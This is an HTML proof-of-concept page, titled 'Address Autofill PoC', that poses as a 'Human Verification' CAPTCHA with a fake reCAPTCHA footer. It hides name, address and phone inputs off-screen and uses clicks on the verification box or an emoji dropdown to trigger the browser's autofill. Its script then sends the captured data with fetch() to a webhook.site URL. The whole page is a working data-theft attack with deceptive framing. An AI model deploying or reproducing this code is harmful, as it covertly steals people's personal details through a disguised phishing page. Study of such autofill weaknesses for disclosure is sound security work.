<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Autofill PoC</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
        }

        h3 {
            color: #1a73e8;
            margin-top: 0;
            margin-bottom: 20px;
            font-weight: 500;
        }

        /* Hidden address fields */
        .address-fields {
            position: fixed;
            top: -1000px;
            left: -1000px;
            opacity: 0;
            pointer-events: none;
        }

        /* Verification box */
        .verify-box {
            background: #e8f0fe;
            border: 2px dashed #1a73e8;
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .verify-box:hover {
            background: #d2e3fc;
            transform: scale(1.02);
        }

        .verify-text {
            font-size: 18px;
            color: #1a73e8;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .verify-sub {
            font-size: 14px;
            color: #5f6368;
        }

        /* Emoji select dropdown */
        .emoji-select {
            text-align: center;
            margin: 20px 0;
        }

        select {
            padding: 12px 30px;
            font-size: 24px;
            border: 2px solid #1a73e8;
            border-radius: 50px;
            background: white;
            cursor: pointer;
            outline: none;
            appearance: none;
        }

        select:hover {
            background: #f1f3f4;
        }

        /* Result box */
        .result-box {
            background: #1e1e1e;
            color: #0f0;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            margin-top: 20px;
            border: 1px solid #333;
            min-height: 60px;
            word-break: break-all;
        }

        .result-label {
            color: #aaa;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .status-badge {
            display: inline-block;
            background: #1a73e8;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            margin-bottom: 10px;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #5f6368;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="card">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <h3>üîê Human Verification</h3>
        <span class="status-badge">Step 1 of 2</span>
    </div>
    
    <!-- Hidden address fields (autofill targets) -->
    <div class="address-fields">
        <input type="text" id="name" name="name" autocomplete="name">
        <input type="text" id="address-line1" name="address-line1" autocomplete="address-line1">
        <input type="text" id="address-line2" name="address-line2" autocomplete="address-line2">
        <input type="text" id="city" name="city" autocomplete="address-level2">
        <input type="text" id="state" name="state" autocomplete="address-level1">
        <input type="text" id="country" name="country" autocomplete="country-name">
        <input type="text" id="postal" name="postal-code" autocomplete="postal-code">
        <input type="tel" id="phone" name="tel" autocomplete="tel">
    </div>

    <!-- Verification box - click target -->
    <div class="verify-box" id="verifyBox">
        <div class="verify-text">ü§ñ Click to verify you're human</div>
        <div class="verify-sub">Complete the puzzle below</div>
    </div>

    <!-- Emoji select dropdown -->
    <div class="emoji-select">
        <select id="emojiPicker">
            <option>üîç Select an animal</option>
            <option>&emsp;&emsp;üê∂&emsp;&emsp;</option>
            <option>&emsp;&emsp;üê±&emsp;&emsp;</option>
            <option>&emsp;&emsp;üêº&emsp;&emsp;</option>
            <option>&emsp;&emsp;ü¶ä&emsp;&emsp;</option>
        </select>
    </div>

    <!-- Result display -->
    <div class="result-label">üìã Captured Address Data:</div>
    <div class="result-box" id="result">
        Waiting for verification...
    </div>
    
    <div class="footer">
        Protected by reCAPTCHA ‚Ä¢ Human verification required
    </div>
</div>

<script>
    const verifyBox = document.getElementById('verifyBox');
    const emojiPicker = document.getElementById('emojiPicker');
    const resultDiv = document.getElementById('result');
    
    // Track if already triggered
    let verificationDone = false;
    
    // Function to capture all address fields
    function captureAddressData() {
        const addressData = {
            name: document.getElementById('name').value,
            address_line1: document.getElementById('address-line1').value,
            address_line2: document.getElementById('address-line2').value,
            city: document.getElementById('city').value,
            state: document.getElementById('state').value,
            country: document.getElementById('country').value,
            postal: document.getElementById('postal').value,
            phone: document.getElementById('phone').value,
            timestamp: new Date().toISOString()
        };
        
        // Display in result box
        resultDiv.innerHTML = JSON.stringify(addressData, null, 2);
        
        // Send to webhook
        fetch('https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3', {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(addressData)
        });
        
        // Update verification box
        verifyBox.innerHTML = `
            <div class="verify-text">‚úÖ Verified! Address captured</div>
            <div class="verify-sub">Data sent to server</div>
        `;
        verifyBox.style.background = '#e6f4ea';
        verifyBox.style.borderColor = '#34a853';
    }
    
    // Main trigger function
    function triggerAutofill() {
        if (verificationDone) return;
        
        // Focus on name field to trigger autofill
        document.getElementById('name').focus();
        
        // Show the emoji picker (like in the reference)
        emojiPicker.showPicker();
        
        // After a short delay, trigger the address autofill picker
        setTimeout(() => {
            // Try to trigger the address autofill dropdown
            document.getElementById('name').focus();
            
            // In Chrome, this might trigger the autofill dropdown
            // Click on the field programmatically
            document.getElementById('name').click();
            
            // For iOS, we need to simulate user interaction
            const event = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true
            });
            document.getElementById('name').dispatchEvent(event);
            
        }, 100);
        
        verificationDone = true;
    }
    
    // Event listeners for address fields
    const addressFields = document.querySelectorAll('.address-fields input');
    addressFields.forEach(field => {
        field.addEventListener('input', function() {
            // Check if all fields are filled
            const name = document.getElementById('name').value;
            const address = document.getElementById('address-line1').value;
            
            if (name && address && !verificationDone) {
                captureAddressData();
            }
        });
        
        field.addEventListener('change', function() {
            const name = document.getElementById('name').value;
            const address = document.getElementById('address-line1').value;
            
            if (name && address && !verificationDone) {
                captureAddressData();
            }
        });
    });
    
    // Click on verification box triggers the flow
    verifyBox.addEventListener('click', function() {
        triggerAutofill();
        
        // Visual feedback
        this.style.background = '#d2e3fc';
        setTimeout(() => {
            this.style.background = '#e8f0fe';
        }, 200);
    });
    
    // Also trigger when emoji picker is opened
    emojiPicker.addEventListener('click', function() {
        if (!verificationDone) {
            triggerAutofill();
        }
    });
    
    // Double-click anywhere also triggers (like in reference)
    document.addEventListener('dblclick', function() {
        if (!verificationDone) {
            triggerAutofill();
        }
    });
    
    console.log('=== Address Autofill PoC Ready ===');
    console.log('Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
</script>

</body>
</html>